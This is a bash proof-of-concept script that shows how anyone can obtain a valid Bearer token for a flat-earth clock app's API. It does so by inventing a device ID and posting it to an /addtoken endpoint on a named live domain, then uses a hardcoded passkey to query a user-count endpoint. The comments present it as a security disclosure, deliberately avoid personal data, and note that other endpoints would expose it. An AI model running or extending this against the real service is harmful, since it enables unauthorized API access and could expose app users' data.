#!/bin/bash
#

# This script demonstrates how easily a valid Bearer token for a device can be requested, 
# allowing access to the flat earth clock app API.
# The /public/api/getUsersCountOnMap endpoint was chosen as the endpoint in this script 
# as it does not leak any personally identifible information.
# Much damage can also be done knowing someone else's device ID.

request_bearer() {
	curl -H "cookie: cf_clearance=${cfclearance}" -H 'accept: application/json' -H 'content-type: application/x-www-form-urlencoded' -H "user-agent: ${useragent}" -H 'accept-language: en-US,en;q=0.9' --compressed -X POST "${sitedomain}${apiprefix}/addtoken" -d "device_id=${deviceid}&device_token=token&device_type=2" > curl_response
}

query_no_params() {
	echo "Calling CURL like this:"

	echo curl -H \"accept: */*\" -H \"content-type: application/json\" -H \"cookie: cf_clearance=${cfclearance}\" --compressed -H \"authorization: Bearer ${bearer}\" -H \"user-agent: ${useragent}\" -H \"accept-language: en-US,en\;q=0.9\" -X POST \"${sitedomain}${apiprefix}${1}\" -d \"{\\\"passkey\\\":\\\"0x2231717ca72f1fb26362ac7bcaccb7394b61f5aa9c99e90f3e53df6da34e29e5\\\"}\"

	curl -H "accept: */*" -H "content-type: application/json" -H "cookie: cf_clearance=${cfclearance}" --compressed -H "authorization: Bearer ${bearer}" -H "user-agent: ${useragent}" -H "accept-language: en-US,en;q=0.9" -X POST "${sitedomain}${apiprefix}${1}" -d "{\"passkey\":\"0x2231717ca72f1fb26362ac7bcaccb7394b61f5aa9c99e90f3e53df6da34e29e5\"}" > curl_response
}

testresponse() {
	(grep "$1" curl_response > /dev/null) || (echo "Can't find \"$1\" in response. Unable to continue" ; exit 1)
}

sitedomain="https://php83.flatsmacker.com"
apiprefix="/public/api"
useragent="FlatEarthSunMoonzodiacClockiOS/1.7 CFNetwork/1568.200.51 Darwin/24.1.0"

if [ ! -f "cf_values" ]; then
	echo "We need the 'cfclearance' cookie."
	echo "Visit this url in a browser with the debugger tool active and on the network tab"
	echo "       ${sitedomain}/public/login"
	echo "get the 'cfclearance' cookie value (the debugger tool should be active first."
	echo "                      It might not set the cookie again without clearing cookies)"
	echo "You should be able to obtain it from the resource query:"
	echo "       ${sitedomain}/cdn-cgi/challenge-platform/h/b/jsd/r/________________"
	echo ""
	echo "What is the cfclearance cookie value (only the value): "
	read cfclearance
	echo ""
	if [ "x$cfclearance" == "x" ]; then
		echo "You didn't enter anything. Run the script again and try again"
		exit 1
	fi

	echo "Future requests will be made using the following http cookie header:"
	echo "	Cookie: cfclearance=${cfclearance}"
	echo "Are you sure this is the value of the cookie? (y/n)"
	read response
	if [ "x$response" == "xy" ]; then
		echo "cfclearance=\"${cfclearance}\"" > cf_values
	else
		echo "Only looking for \"y\" and \"${response}\" provided. Doing nothing"
		exit 1
	fi
fi

if [ ! -f deviceid ]; then
	sumphrase="The flat earth clock app is a major security risk"
	echo "We don't have a device ID. We need to construct one."
	echo "Enter something. Anything. It will be appended to \"${sumphrase} \" and the current date"
	read str
	if [ "x$str" == "x" ]; then
		echo "Please run the script again, but enter something next time"
		exit 1
	fi
	curdate=`date`
	echo "creating an md5sum value \"deviceid\" from the following:"
	echo "           \"${sumphrase} ${curdate}: ${str}\""
	deviceid=`echo "${sumphrase} ${curdate}: ${str}" | md5sum | sed 's/ .*$//'`
	echo "This is the device ID that will be used: \"$deviceid\""
	echo "Do you want to keep it?"
	read response
	if [ "x$response" == "xy" ]; then
		echo "deviceid=\"${deviceid}\"" > deviceid
	else
		echo "Only looking for \"y\" and \"${response}\" provided. Doing nothing"
		exit 1
	fi
fi

source cf_values
source deviceid

echo "cfclearance=${cfclearance}"
echo "deviceid=${deviceid}"

if [ ! -f bearer ]; then
	echo ""
	echo ""
	echo "Getting the bearer token for device id ${deviceid}"
	request_bearer
	# returns:
	# {"success":"TRUE","status":1,"token":"<___THIS IS WHAT WE ARE INTERESTED IN___>"}
	testresponse '"token":"'
	bearer=`cat curl_response | grep '"token":"' | sed 's/^.*"token":"//' | sed 's/".*$//'`
	if [ "x$bearer" == "x" ]; then
		echo "Something went wrong. Can't continue"
		exit 1
	fi

	echo "bearer=${bearer}" > bearer
fi

source bearer

echo "bearer is ${bearer}"
echo ""
echo ""

# THIS QUERY IS FAIRLY SAFE AND HAS NO PII. OTHERS COULD BE USED SUCH AS THE ONE FOR THE LEADERBOARD
# BUT RETRIEVING PII IS NOT THE PURPOSE OF THIS SCRIPT
echo ""
echo ""

query_no_params "/getUsersCountOnMap"
echo "The response was:"
cat curl_response
echo ""
testresponse '"totaluser":'
users=`cat curl_response | sed 's/^.*"totaluser"://' | sed 's/,.*$//'` 
echo "Extracted user count: ${users}"

